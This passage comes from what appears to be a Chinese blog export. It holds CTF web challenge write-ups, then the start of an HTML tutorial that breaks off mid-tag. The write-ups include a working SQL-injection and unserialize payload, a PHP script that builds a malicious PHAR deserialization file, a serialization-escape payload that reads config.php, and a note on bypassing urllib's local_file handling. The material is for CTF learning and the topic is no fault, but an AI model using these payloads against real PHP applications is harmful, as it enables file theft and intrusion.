/可以绕过\n```mysql\n/view.php?no=-1/**/union/**/select/**/1,2,3,'O:8:\"UserInfo\":3:{s:4:\"name\";s:3:\"jwt\";s:3:\"age\";i:18;s:4:\"blog\";s:29:\"file:///var/www/html/flag.php\";}'#\n```\n\n![](https://i.loli.net/2019/09/14/ufj347VUaGYK5NB.png)\n解密base64得到flag\n![](https://i.loli.net/2019/09/14/8WHsKR2njaoG1uD.png)\n### Dropbox【CISCN2019 华北赛区 Day1 Web1】\n**知识点**：任意文件下载,PHAR反序列化RCE\n参考：\n[ciscn2019华北赛区半决赛day1_web1题解](https://www.cnblogs.com/kevinbruce656/p/11316070.html)\n[buuctf-web-[CISCN2019 华北赛区 Day1 Web1]Dropbox](https://blog.csdn.net/weixin_43345082/article/details/100102082)\n[什么是Phar反序列化](https://blog.ripstech.com/2018/new-php-exploitation-technique/)\n[利用phar拓展php反序列化漏洞攻击面](https://paper.seebug.org/680/)\n进入解题页面发现需要登录，注册一个账号，登录以后是一个网盘的页面，最开始只有上传功能，并且只能上传png,jpg等图片格式。\n![](https://i.loli.net/2019/09/15/zZd7kmy32DSNV6r.png)\n随便上传一个符合要求的文件，发现可以对其进行下载和删除。\n![](https://i.loli.net/2019/09/15/DmMIGt3rpJWUwAu.png)\n通过抓下载的包发现，该处存在一个任意文件下载的漏洞，修改文件名filename=…/…/index.php,可以下载源码\n![](https://i.loli.net/2019/09/15/Ssdeo5IpYFwtWGz.png)\n利用该漏洞下载download.php,delete.php以及其需要包含的class.php的内容。\n![](https://i.loli.net/2019/09/15/fivwX6WCR5lTZsj.png)\n重点是class.php和delete.php\n分析download.php的核心源码\n```php\n<?php\nif (strlen($filename) < 40 && $file->open($filename) && stristr($filename, \"flag\") === false) {\n    #省略一些代码\n    echo $file->close();\n} else {\n    echo \"File not exist\";\n}\n?>\n```\n可以发现，该文件只有很常规的下载文件操作，并且限制了不能下载文件名中带有flag的文件。\n接着分析class.php\n```php\n<?php\n#代码精简一下\nclass File {\n    public $filename;\n\n    public function close() {\n        return file_get_contents($this->filename);\n    }\n}\nclass User {\n    public $db;\n    public function __destruct() {\n        $this->db->close();\n    }\n}\nclass FileList {\n    private $files;\n    private $results;\n    private $funcs;\n\n    public function __call($func, $args) {\n        array_push($this->funcs, $func);\n        foreach ($this->files as $file) {\n            $this->results[$file->name()][$func] = $file->$func();\n        }\n    }\n    public function __destruct() {\n        #省略了一些影响阅读的table创建代码\n        $table .= '<thead><tr>';\n        foreach ($this->funcs as $func) {\n            $table .= '<th scope=\"col\" class=\"text-center\">' . htmlentities($func) . '</th>';\n        }\n        $table .= '<th scope=\"col\" class=\"text-center\">Opt</th>';\n        $table .= '</thead><tbody>';\n        foreach ($this->results as $filename => $result) {\n            $table .= '<tr>';\n            foreach ($result as $func => $value) {\n                $table .= '<td class=\"text-center\">' . htmlentities($value) . '</td>';\n            }\n            $table .= '</tr>';\n        }\n        echo $table;\n    }\n}\n?>\n```\n**1**.File类中的close方法会获取文件内容，如果能触发该方法，就有可能获取flag。\n**2**.User类中存在close方法，并且该方法在对象销毁时执行。\n**3**.同时FileList类中存在call魔术方法，并且类没有close方法。如果一个Filelist对象调用了close()方法，根据call方法的代码可以知道，文件的close方法会被执行，就可能拿到flag。\n\n根据以上三条线索，梳理一下可以得出结论:\n\n`如果能创建一个user的对象，其db变量是一个FileList对象，对象中的文件名为flag的位置。这样的话，当user对象销毁时，db变量的close方法被执行；而db变量没有close方法，这样就会触发call魔术方法，进而变成了执行File对象的close方法。通过分析FileList类的析构方法可以知道，close方法执行后存在results变量里的结果会加入到table变量中被打印出来，也就是flag会被打印出来。`\n\n想实现上述想法，可以借助phar的伪协议。\n运行如下PHP文件，生成一个phar文件，更改后缀名为png进行上传。\n```php\n<?php\n\nclass User {\n    public $db;\n}\n\nclass File {\n    public $filename;\n}\nclass FileList {\n    private $files;\n    private $results;\n    private $funcs;\n\n    public function __construct() {\n        $file = new File();\n        $file->filename = '/flag.txt';\n        $this->files = array($file);\n        $this->results = array();\n        $this->funcs = array();\n    }\n}\n\n@unlink(\"phar.phar\");\n$phar = new Phar(\"phar.phar\"); //后缀名必须为phar\n\n$phar->startBuffering();\n\n$phar->setStub(\"<?php __HALT_COMPILER(); ?>\"); //设置stub\n\n$o = new User();\n$o->db = new FileList();\n\n$phar->setMetadata($o); //将自定义的meta-data存入manifest\n$phar->addFromString(\"jwt.txt\", \"test\"); //添加要压缩的文件\n//签名自动计算\n$phar->stopBuffering();\n?>\n```\n生成phar文件后在删除的时候进行触发即可得到flag。\n因此在删除时使用burpsite抓包，修改参数，即可得到flag。\n![](https://i.loli.net/2019/09/15/p9Wuc4IhEMeKsVq.png)\n### piapiapia【2016-0CTF】\n**知识点**：数组绕过正则及相关,改变序列化字符串长度导致反序列化漏洞，PHP反序列化逃逸\n**参考**：[2016 0CTF—piapiapia](https://tanpuhan.github.io/2019/09/14/2016-0CTF%E2%80%94piapiapia/) , [0ctf 2016 部分 web writeup](https://www.virzz.com/2016/03/14/some_web_writeup_for_0ctf_2016.html)，[利用数组绕过问题小总结](https://www.jianshu.com/p/8e3b9d056da6?utm_campaign=maleskine&utm_content=note&utm_medium=seo_notes&utm_source=recommendation)\n**预备知识**：改变序列化字符串长度导致反序列化漏洞\n`unserialize()`会忽略能够正常序列化的字符串后面的字符串\n比如：\n```\na:4:{s:5:\"phone\";s:11:\"13587819970\";s:5:\"email\";s:32:\"aaaaaaaaaa@aaaaaaaaaa.aaaaaaaaaa\";s:8:\"nickname\";s:10:\"12345hacke\";s:5:\"photo\";s:10:\"config.php\";}s:39:\"upload/f47454d1d3644127f42070181a8b9afc\";}\n```\n反序列化会正常解析\n```\na:4{s:5:\"phone\";s:11:\"13587819970\";s:5:\"email\";s:32:\"aaaaaaaaaa@aaaaaaaaaa.aaaaaaaaaa\";s:8:\"nickname\";s:10:\"12345hacke\";s:5:\"photo\";s:10:\"config.php\";}\n```\n忽略`s:39:\"upload/f47454d1d3644127f42070181a8b9afc\";}`，从而导致读取`config.php`\n可以利用这个规则构造字符串来闭合，如本题中filter()将where替换成hacker，就可以将这个成员的最后一个字符挤出去，重复34次就可以挤出34个字符，正好闭合改序列化字符串\n\n---\n打开题目，典型的登录界面\n猜测是否有注册，发现/register.php，注册后登陆，进入到update.php页面\n![](https://i.loli.net/2019/09/23/oNHDnA3W7iePr1k.png)\n进行一下目录扫描，dirsearch扫出了源码www.zip\n![](https://i.loli.net/2019/09/23/Vj8oW6KEqedOnJ5.png)\n下载www.zip，得到如下\n![](https://i.loli.net/2019/09/23/5N8QF2tzRphbjUr.png)\n先拿seay代码审计一下看下大概会有什么漏洞\n![](https://i.loli.net/2019/09/23/Ni5b74zgEwFnUhT.png)\n在profile.php中有文件读取\n```php\nelse {\n\t\t$profile = unserialize($profile);\n\t\t$phone = $profile['phone'];\n\t\t$email = $profile['email'];\n\t\t$nickname = $profile['nickname'];\n\t\t$photo = base64_encode(file_get_contents($profile['photo']));\n?>\n```\n又发现在config.php中有flag的标识,看来flag就是在config.php中了\n```php\n<?php\n\t$config['hostname'] = '127.0.0.1';\n\t$config['username'] = 'root';\n\t$config['password'] = '';\n\t$config['database'] = '';\n\t$flag = '';\n?>\n```\n那么基本可以确定思路就是使`$profile['photo']`等于`config.php`从而就可以读出config.php的flag了\n**反序列化逃逸**:\n对`photo`进行操作的地方在`update.php`中\n```php\n     <?php\n\trequire_once('class.php');\n\tif($_SESSION['username'] == null) {\n\t\tdie('Login First');\t\n\t}\n\tif($_POST['phone'] && $_POST['email'] && $_POST['nickname'] && $_FILES['photo']) {\n\n\t\t$username = $_SESSION['username'];\n\t\tif(!preg_match('/^\\d{11}$/', $_POST['phone']))\n\t\t\tdie('Invalid phone');\n\n\t\tif(!preg_match('/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\\.[_a-zA-Z0-9]{1,10}$/', $_POST['email']))\n\t\t\tdie('Invalid email');\n\t\t\n\t\tif(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)\n\t\t\tdie('Invalid nickname');\n\n\t\t$file = $_FILES['photo'];\n\t\tif($file['size'] < 5 or $file['size'] > 1000000)\n\t\t\tdie('Photo size error');\n\n\t\tmove_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name']));\n\t\t$profile['phone'] = $_POST['phone'];\n\t\t$profile['email'] = $_POST['email'];\n\t\t$profile['nickname'] = $_POST['nickname'];\n\t\t$profile['photo'] = 'upload/' . md5($file['name']);\n\n\t\t$user->update_profile($username, serialize($profile));\n\t\techo 'Update Profile Success!<a href=\"profile.php\">Your Profile</a>';\n\t}\n\telse {\n?>\n```\n在设置了`$profile`之后，用`update_profile()`函数进行处理：\n```\npublic function update_profile($username, $new_profile) {\n\t\t$username = parent::filter($username);\n\t\t$new_profile = parent::filter($new_profile);\n\n\t\t$where = \"username = '$username'\";\n\t\treturn parent::update($this->table, 'profile', $new_profile, $where);\n\t}\n```\n`update_profile()`函数调用了`filter`函数\n```\npublic function filter($string) {\n\t\t$escape = array('\\'', '\\\\\\\\');\n\t\t$escape = '/' . implode('|', $escape) . '/';\n\t\t$string = preg_replace($escape, '_', $string);\n\n\t\t$safe = array('select', 'insert', 'update', 'delete', 'where');\n\t\t$safe = '/' . implode('|', $safe) . '/i';\n\t\treturn preg_replace($safe, 'hacker', $string);\n\t}\n```\n进行了过滤,fileter函数中进行了对单引号、双反斜杠的过滤，以及将select、insert、update、delete、where字符串替换成hacker,这里就会出现一个问题，只有where是长度为5的字符串，即如果字符串中有where会被替换成字符串长度为6的hacker字符串,如果我们输入的有where，会替换成hacker，这样的话长度就变了\n**开始构造**：\n想要读取photo,所以只能操作nickname，使其溢出到photo\n输入nickname时候有一个正则\n```\nif(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)\n\t\t\tdie('Invalid nickname');\n```\n对于nickname这个参数，看到熟悉的preg_match和strlen，可以用数组绕过(`nickname[]=`)\n\n\n数组绕过了第一个正则过滤之后，如果nickname最后面塞上`\";}s:5:\"photo\";s:10:\"config.php\";}`，一共是34个字符，如果利用34个where，在where被正则匹配换成hacker之后,就多出34个字符，不就可以把这34个给挤出去，然后`\"};s:5:“photo”;s:10:“config.php”;}`也就不是nickname的一部分了，被反序列化的时候就会被当成`photo`，就可以读取到`config.php`的内容了,后面的upload因为序列化串被我们闭合了也就没用了：\n```\npayload:\n\nnickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere\";}s:5:\"photo\";s:10:\"config.php\";}\n\n$profile = a:4:{s:5:\"phone\";s:11:\"12345678901\";s:5:\"email\";s:10:\"123@qq.com\";s:8:\"nickname\";a:1:{i:0;s:204:\"wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere\"};s:5:\"photo\";s:10:\"config.php\";}s:39:\"upload/804f743824c0451b2f60d81b63b6a900\";}\n```\n下面开始操作：\n注册之后登陆，进入到update.php页面，输入相应信息和构造的nickename及上传图片，用bp抓包把nickname改成数组即可：\n![](https://i.loli.net/2019/09/23/RgU64XJrAEsPMlD.png)\n然后访问profile.php查看源码，把base64码解码：\n![](https://i.loli.net/2019/09/23/BRkSthcE4PUyILf.png)\n![](https://i.loli.net/2019/09/23/Unr64PHdY9klBvp.png)\n### ikun【CISCN2019 华北赛区 Day1 Web2】\n题目复现链接：\nhttps://buuoj.cn/challenges\n[CISCN 2019 华北赛区 Day1 Web2](https://github.com/CTFTraining/ciscn_2019_web_northern_china_day1_web2)\n#### 知识点\n##### 1、逻辑漏洞\n可以通过抓包修改折扣等数据来购买\n##### 2、JSON Web Token(JWT)\n[认识JWT](https://www.cnblogs.com/cjsblog/p/9277677.html)\n##### 3、jwt-cookies伪造\n解析jwt：\nhttps://jwt.io/\n爆破密钥：\nc-jwt-cracker:\nhttps://github.com/brendan-rius/c-jwt-cracker\n\n##### 4、Python反序列化\n[一篇文章带你理解漏洞之 Python 反序列化漏洞！](http://www.sohu.com/a/274879579_729271)\n[Python反序列化漏洞的花式利用](https://xz.aliyun.com/t/2289)\n[(Python) cPickle反序列化漏洞](https://blog.csdn.net/SKI_12/article/details/85015803)\n[关于Python sec的一些简单的总结](http://bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/)\n\n#### 解题方法\n[CISCN 华北赛区 Day1 Web2](https://blog.csdn.net/qq_26406447/article/details/91964502)\n[CISCN 华北赛区 Day1 Web2 WriteUp](https://www.zhaoj.in/read-5946.html/comment-page-1#comment-4747)\n[[CISCN2019]华北赛区-天枢&waterflower](https://xz.aliyun.com/t/5383)\n### SSRF Me【2019-De1CTF】\n#### 知识点\n##### 1、MD5长度扩展攻击\n攻击场景：file=filename&hash=md5($secret_key.filename)验证成功下载文件\n目的：传入任意filename实现任意文件读取\n条件：\n```\n已知任意一个md5($secret_key.filename)，并且知道filename的明文。\n已知secret_key的长度。\n用户可以提交md5值。\n```\n工具：[HashPump/python模块:hashpumpy](https://github.com/bwall/HashPump)\n参考：\n[hash扩展长度攻击及hashdump使用](https://www.cnblogs.com/gwind/p/8025130.html)\n[Hash Length Extension Attack](https://joychou.org/web/hash-length-extension-attack.html#directory070830946390658543)\n[浅谈MD5扩展长度攻击](https://github.com/mstxq17/cryptograph-of-web/blob/master/%E6%B5%85%E8%B0%88MD5%E6%89%A9%E5%B1%95%E9%95%BF%E5%BA%A6%E6%94%BB%E5%87%BB.md)\n##### 2、Python 2.x - 2.7.16 urllib.fopen支持local_file导致LFI(CVE-2019-9948)\n当不存在协议的时候，默认使用file协议读取\n可以使用`local_file:`绕过，例如`local_file:flag.txt`路径就是相对脚本的路径\n`local_file://`就必须使用绝对路径(协议一般都是这样)\n`local-file:///proc/self/cwd/flag.txt`也可以读取，因为`/proc/self/cwd/`代表的是当前路径\n如果使用` urllib2.urlopen(param)`去包含文件就必须加上`file`，否则会报`ValueError: unknown url type: /path/to/file`的错误\n#### 解题方法\n[De1CTF ssrf_me 的三种解法](https://xz.aliyun.com/t/5927)\n[浅析De1CTF 2019的两道web SSRF ME && ShellShellShell](https://xz.aliyun.com/t/6050)\n\n### SSRFme【2017-Hitcon】\n#### 解题方法\n[BUUCTF web writeup(二)](http://chenxiyuan.vip/2019/07/29/BUUCTF-web-writeup-%E4%BA%8C/)","tags":["Write-up"],"categories":["CTF"]},{"title":"Web前端三剑客学习笔记","url":"/posts/38162.html","content":"\n![](https://img.jwt1399.top//img/20200824184057.png)\n\n## 前言\n\n一直没有系统的学习`HTML`,`CSS`,`JS`都是东学一点，西学一点，想着暑假得空，便系统的学习下吧，故于此记录之。\n\n2020.2.25更新：由于本专业开设了`《web应用开发》`课，于是乎本文档得到了进一步完善。\n\n## HTML\n\n>超文本标记语言（HyperText Markup Language，简称：HTML）是一种用于创建网页的标准标记语言。\n您可以使用 HTML 来建立自己的 WEB 站点，HTML 运行在浏览器上，由浏览器来解析。\n\n### 1 编译器\n\n个人喜欢VS Code，简单，方便，有很多好用的插件\nVS Code：https://code.visualstudio.com/\n使用方法：\n新建一个`HTML学习`文件夹后，用VS Code 打开，在文件夹中新建`index.html`文件，输入`!`再按`Tab`键，得到最基础的`HTML`\n\n### 2 基础\n\nHTML 最基本元素\n![](https://i.loli.net/2019/08/10/avRMwQWzg8iPNS1.png)\n\n```html\n<!DOCTYPE html> 声明为 HTML5 文档\n<html> 元素是 HTML 页面的根元素\n<head> 元素包含了文档的元（meta）数据，如 <meta charset=\"utf-8\"> 定义网页编码格式为 utf-8。\n<title> 元素描述了文档的标题\n<body> 元素包含了可见的页面内容\n```\nHTML 注释`<!---->`\n```html\n<!--这是一个注释-->\n\n注释在源码中才能看到\n```\nHTML 标题 `<h1> - <h6>`\n```html\n<h1>这是h1标题</h1>\n<h2>这是h2标题</h2>\n<h3>这是h3标题</h3>\n```\nHTML 换行 `<br/>`\n```html\n123<br/>456\n```\nHTML 段落 `<p>`\n```html\n<p>这是一个段落。</p>\n<p>这是另外一个段落。</p>\n```\nHTML 链接 `<a>`\n```html\n<a href=\"https://jwt1399.top\">简简的博客</a>\n\n<a href=\"eg.html\" target=\"_blank\">打开本地链接</a>\ntarget=\"_blank\"：从新的窗口打开\n```\n\nHTML 图像 `<img>`\n```html\n<img src=\"/images/logo.png\" width=\"304\" height=\"304\" />\n```\n上方标签演示：\n![](https://i.loli.net/2019/08/10/T2MYLZ15taOV8HE.png)\n![](https://i.loli.net/2019/08/10/1LHk3l6deXBZERV.png)\n\n### 3 样式\n\n外部样式表：(存在于head)\n```html\n<link rel=\"stylesheet\" type=\"text/css\" href=\"mystyle.css\">\n```\nmystyle.css\n```css\nh1{\n    color:red;\n}\n```\n内部样式表：(存在于head)\n```html\n<style type=\"text/css\">\n        p{\n        color:aqua\n        }\n    </style>\n```\n内联样式表：\n```html\n<a href=\"https://jwt1399.top\" style=\"color:aquamarine\">点击我跳转到简简的博客</a>\n```\n### 4 链接\n\n文本链接：(点击文字跳转到指定链接)\n```html\n <a href=\"https://jwt1399.top\" >点击我跳转到简简的博客</a>\n```\n图片链接：(点击图片跳转到指定链接)\n```html\n<a href=\"https://jwt1399.top\" ><img src=\"logo.png\" width=\"100px\" height=\"100px\" alt=\"这是一个logo\"></a>\n<!--alt:图片加载失败显示的文字-->\n```\n文档内链接：(例如跳转到页面底部)\n```html\n<a name=\"tips\">hello</a><!--换行是为了更好演示效果-->\n    <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/>\n    <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/>\n    <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/>\n<a href=\"#tips\">跳转到hello</a>\n```\n超链接伪协议：链接到电话、短信、邮件\n```html\n<a href=\"tel:110\" >请电话联系警察叔叔</a>\n<a href=\"sms:110\" >请短信联系警察叔叔</a>\n<a href=\"mailTo:110@sina.com\" >请Email联系警察叔叔</a>\n```\n### 5 表格\n\n![20190811100613243.png](https://i.loli.net/2020/03/10/X4dNvhWn9A83wTp.png)\n```html\n<!--border：边框 cellpadding:表格大小 cellspacing:单元格间距-->\n<table border=\"1\" cellpadding=\"20\" cellspacing=\"5\" bgcolor=\"#FF4B5D\" background=\"logo.png\">\n        <caption>信息表</caption> <!--单元格标题-->\n        <tr>  <!--行-->\n            <th>学号</th>  <!--表头-->\n            <th>姓名</th>\n            <th>年龄</th>\n        </tr>\n        <tr>\n            <td>0001</td>  <!--列-->\n            <td>小明</td>\n            <td>18</td>\n        </tr>\n        <tr>\n            <td>0002</td>\n            <td>小红</td>\n            <td>18</td>\n        </tr>\n    </table>\n```\n上方标签演示：\n\n![](https://i.loli.net/2020/03/10/Ce4Hy683kdbwtJX.png)\n\n![](https://i.loli.net/2020/03/10/xcFOJ5QWKS1hRea.png)\n\n### 6 列表\n\n![](https://i.loli.net/2020/03/10/xC6DMGOvBW9J1H8.png)\n无序列表：\n\n```html\n<!--type:无序标识样式 disc实心圆,cirle空心圆,square方块-->\n    <ul type=\"square\">\n        <li>苹果</li>\n        <li>西瓜</li>\n        <li>香蕉</li>\n    </ul>\n```\n有序列表：\n```html\n<!--type:排序方式 1,A,a,I,i,start-->\n    <ol type=\"1\">\n        <li>苹果</li>\n        <li>西瓜</li>\n        <li>香蕉</li>\n    </ol>\n```\n嵌套列表：\n```html\n<!--无序嵌套列表-->\n    <ul>\n        <li>动物</li>\n        <ul>\n            <li>猫</li>\n            <li>狗</li>\n        </ul>\n        <li>植物</li>\n        <ul>\n            <li>花</li>\n            <li>草</li>\n        </ul>        \n    </ul>\n <!--有序嵌套列表-->\n    <ol>\n        <li>动物</li>\n        <ol>\n            <li>猫</li>\n            <li>狗</li>\n        </ol>\n        <li>植物</li>\n        <ol>\n            <li>花</li>\n            <li>草</li>\n        </ol>        \n    </ol>\n```\n自定义列表：\n```html\n<dl>\n        <dt>hello </dt>\n        <dd>这是你好的意思</dd>\n        <dt>Hi</dt>\n        <dd>这也是你好的意思</dd>\n</dl>\n```\n上方标签演示：\n\n![](https://i.loli.net/2020/03/10/HWYSQ5b3rkL98ve.png)\n\n![](https://i.loli.net/2020/03/10/c6gaIzFnlZVh59Y.png)\n\n![](https://i.loli.net/2020/03/10/vCmjfSNwcLYBeWQ.png)\n\n![](https://i.loli.net/2020/03/10/ZCnI1QOztSqx9fh.png)\n\n### 7 布局\n\n`<div> </div>`\n`<table> </table>`\n**div布局：**\n\n```html\n<body>\n    \n<div id=\"container\">\n    <div id=\"heading\">头部</div>\n    <div id=\"content_menu\">内容菜单</div>\n    <div id=\"content_body\">内容主体</div>\n    <div id=\"footing\">底部</div>\n</div>\n\n</body>\n```\n**div样式设计：**\n\n```html\n<head>\n    <meta charset=\"UTF-8\">\n    <title>div布局</title>\n    <style type=\"text/css\">\n    body{\n        margin: 0px;/*去除边框*/\n    }\n    #container{\n        width: 100%;\n        height:950px;\n        background-color: aqua;\n    } \n    #heading{\n        width: 100%;\n        height: 10%;\n        background-color: aquamarine;\n    }\n    #content_menu{\n        width: 30%;\n        height: 80%;\n        background-color: blueviolet;\n        float: left;  /*从左向右排列*/\n    } \n    #content_body{\n        width: 70%;\n        height: 80%;\n        background-color:chartreuse;\n        float: left;/*从左向右排列*/\n    }\n    #footing{\n        width: 100%;\n        height: 10%;\n        background-color: crimson;\n        clear: both;/*清除从左向右排列*/\n    }\n    </style>\n</head>\n```\n**上方标签演示：**\n\n![](https://i.loli.net/2020/03/10/PZWBALCrUObqJda.png)\n\n![](https://i.loli.net/2020/03/10/JGqAk35sxawSTH4.png)\n![](https://i.loli.net/2020/03/10/pEIPVJ2ksamGTjL.png)\n**table布局：**\n\n```html\n<body marginheight=\"0px\" marginwidth=\"0px\">  <!--去除边框-->\n    <table width=\"100%\" height=\"950px\" style=\"background-color:cyan\">\n        <tr><!--colspan=\"2\":合并左右两个单元格-->\n            <td  colspan=\"3\" width=\"100%\" height=\"10%\" style=\"background-color: aquamarine\">头部</td>\n        </tr>\n        <tr>\n            <td width=\"30%\" height=\"50%\" style=\"background-color: blueviolet\">内容菜单\n            <ul>\n                <li>HTML</li>\n                <li>CSS</li>\n                <li>JS</li>\n            </ul>\n            </td>\n            <td width=\"70%\" height=\"50%\" style=\"background-color: chartreuse\">内容主体</td>           \n        </tr>\n        <tr>\n            <td colspan=\"3\" width=100% height=\"40%\" style=\"background-color: crimson\">底部</td>\n        </tr>\n    </table>\n</body>\t\n```\n**上方标签演示：**\n![](https://i.loli.net/2020/03/10/37FJBayRMq8bkWj.png)\n\n![](https://img.jwt1399.top//img/20200810120839.png)\n\n### 8 基础表单\n\n参考：[HTML-表单（非常详细）](https://blog.csdn.net/nanjinzhu/article/details/82251110)\n\n\n>`<form> </form>`  表单用于搜集不同类型的用户输入\n\n**语法：**\n\n```html\n<form name=\"表单名\" method=\"get/post\" action=\"表单发往地\">\n   <input type=\" \" name=\" \" />\n</form>\n```\n| **属性**      | **说明**                                        |\n| ------------- | ----------------------------------------------- |\n| **type**      | 指定元素的类型。                                |\n| **name**      | 指定表单元素的名称。                            |\n| **value**     | 元素的初始值。type 为 radio时必须指定一个值。   |\n| **size**      | 指定表单元素的初始宽度。                        |\n| **maxlength** | type为text 或 password 时，输入的最大字符数。   |\n| **checked**   | type为radio或checkbox时，指定按钮是否是被选中。 |\n\n| type基础属性值 | 描述                                               |\n| :------------- | :------------------------------------------------- |\n| button         | 定义可点击按钮。                                   |\n| checkbox       | 定义复选框。                                       |\n| file           | 定义输入字段和 \"浏览\"按钮，供文件上传。            |\n| hidden         | 定义隐藏的输入字段。                               |\n| image          | 定义图像形式的提交按钮。                           |\n| password       | 定义密码字段。该字段中的字符被掩码。               |\n| radio          | 定义单选按钮。                                     |\n| reset          | 定义重置按钮。清除表单中的所有数据。               |\n| submit         | 定义提交按钮。把表单数据发送到服务器。             |\n| text           | 定义单行的输入字段，默认宽度为 20 个字符。         |\n| textarea       | 定义多行文本输入字段 `<textarea>默认值</textarea>` |\n| select和option | 定义下拉列表框                                     |\n\n文本：\n\n```html\n      用户名：\n      <input type=\"text\">\n      密码:\n      <input type=\"password\">\n```\n提交：\n```html\n      <input type=\"submit\" value=\"提交\">\n```\n复选框:\n```html\n      你喜欢的水果有：\n      苹果<input type=\"checkbox\">\n      西瓜<input type=\"checkbox\">\n      香蕉<input type=\"checkbox\">\n```\n 单选框:\n ```html\n      性别：\n      男<input type=\"radio\" name=\"sex\">\n      女<input type=\"radio\" name=\"sex\">\n ```\n  下拉列表:\n  ```html\n      请选择一个网址：\n      <select>\n          <option>jwt1399.top</option>\n          <option>www.baidu.com</option>\n          <option>www.google.com</option>\n      </select>\n  ```\n按钮:\n```html\n      <input type=\"button\" value=\"按钮\">\n```\n文本域:(放在`<form>`之外)\n```html\n        <textarea cols=\"30\" rows=\"10\">请在此填写你的个人爱好：</textarea>\n```\n上方标签演示：\n![](https://i.loli.net/2020/03/10/xLHoJmFgSP8Qsji.png)\n![](https://i.loli.net/2020/03/10/R4VSp5crEybLwDO.png)\n\n### 9 新增表单input元素\n\n参考：[HTML5新增input元素的类型](https://blog.csdn.net/qq_35095321/article/details/62420732)\n\n| type新属性值      | 描述                                                   |\n| ----------------- | ------------------------------------------------------ |\n| type=“tel\"        | 输入电话号码                                           |\n| type=\"email\"      | 限制用户输入必须为Email类型                            |\n| type=\"url\"        | 限制用户输入必须为URL类型                              |\n| type=\"number\"     | 限制用户输入必须为数字类型                             |\n| type=\"range\"      | 产生一个滑动条的表单                                   |\n| type=\"search“     | 产生一个搜索意义的表单                                 |\n| type=\"color\"      | 生成一个颜色选择表单                                   |\n| type=\"time\"       | 限制用户输入必须为时间类型                             |\n| type=\"date\"       | 限制用户输入必须为日期类型                             |\n| type=\"month\"      | 限制用户输入必须为月类型                               |\n| type=\"week\"       | 限制用户输入必须为周类型                               |\n| `<label>`表单控件 | 方便鼠标点击使用，label 元素内点击文本，就会触发此控件 |\n`<label>`用法：`<label for=\"控件id\"></label>`\n\n```html\n<form>\n      <input type=\"checkbox\" name=\"user_ball\"  id=\"basketball\">\n\t  <label for=\"basketball\">篮球</label>\n     \n      <input type=\"checkbox\" name=\"user_ball\"  id=\"football\" checked>\n\t  <label for=\"football\">足球</label>\n      \n      <input type=\"checkbox\" name=\"user_ball\"  id=\"pingpangball\">\n\t  <label for=\"pingpangball\">乒乓球</label>\n</form>\n```\n\n![](https://i.loli.net/2020/03/20/vRwaSbO39zyDVG7.png)\n\n### 10 表单与PHP交互\n\nGET方式交互：\n首先建立一个表单：\n\n```html\n <!-- action:提交的地址,method:提交方式-->\n  <form action=\"http://127.0.0.1/eg.php\" method=\"GET\">\n      用户名：<input type=\"text\" name=\"id\">\n      密  码: <input type=\"password\" name=\"password\">\n      <!--提交-->\n      <input type=\"submit\" value=\"提交\">\n      <br/>      \n  </form>\n```\n表单交互的文件：eg.php\n```php\n<?php\nheader(\"Content-type: text/html; charset=utf-8\");//防止中文乱码\necho \"用户名:\".$_GET['id'].\"<br>密码:\".$_GET['password'];//输出GET方式传进的id和password\n?>\n```\nphp文件放在本地服务器的`www`目录下才能运行\n![](https://i.loli.net/2020/03/10/jaLPqKExz5Dly36.png)\n查看我们写好的表单\n![](https://i.loli.net/2020/03/10/v7HUlu9IzAmrObw.png)\n![](https://i.loli.net/2020/03/10/l36Se52KDABLjH1.png)\n输入用户名和密码，点击提交，发现已经被提交到了目标地址,id和password会直接显示在`URL框`中，`POST方式`则不会\n![](https://i.loli.net/2020/03/10/PKcsLb3plGW8orx.png)\nPOST方式交互：\n首先建立一个表单：\n\n```html\n <!-- action:提交的地址,method:提交方式-->\n  <form action=\"http://127.0.0.1/eg.php\" method=\"POST\">\n      用户名：<input type=\"text\" name=\"id\">\n      密  码: <input type=\"password\" name=\"password\">\n      <!--提交-->\n      <input type=\"submit\" value=\"提交\">\n      <br/>      \n  </form>\n```\n表单交互的文件：eg.php\n```php\n<?php\nheader(\"Content-type: text/html; charset=utf-8\");//防止中文乱码\necho \"用户名:\".$_POST['id'].\"<br>密码:\".$_POST['password'];//输出POST方式传进的id和password\n?>\n```\n查看我们写好的表单\n![](https://i.loli.net/2020/03/10/YBvVcObAUoQLfp7.png)\n输入用户名和密码，点击提交，发现已经被提交到了目标地址\n![](https://i.loli.net/2020/03/10/6uLiw35Eg1Yfvx9.png)\n\n###  11 框架\n\n框架：`<frame>` \n框架集：`<frameset>`\n内联框架：`<iframe>`\n不放在`<body>`中\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>框架</title>  \n</head>\n<!--cols:纵向 rows:横向-->\n    <frameset rows=\"20%,50%,30%\">\n        <frame src=\"frame1.html\">\n        <frame src=\"frame2.html\">\n        <frame src=\"frame3.html\">\n    </frameset>\n</html>\n```\nframe1.html(frame2和3一样只是bgcolor颜色改一哈)\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Document</title>\n</head>\n<body bgcolor=\"blue\">\n</body>\n</html>\n```\n上方运行结果：\n![](https://i.loli.net/2020/03/10/bW4dCcAZzrVERP8.png)\n内联框架：\nindex.html\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>框架</title>  \n</head>\n    <br>\n    <iframe src=\"frame3.html\" frameborder=\"0\" width=\"800px\" 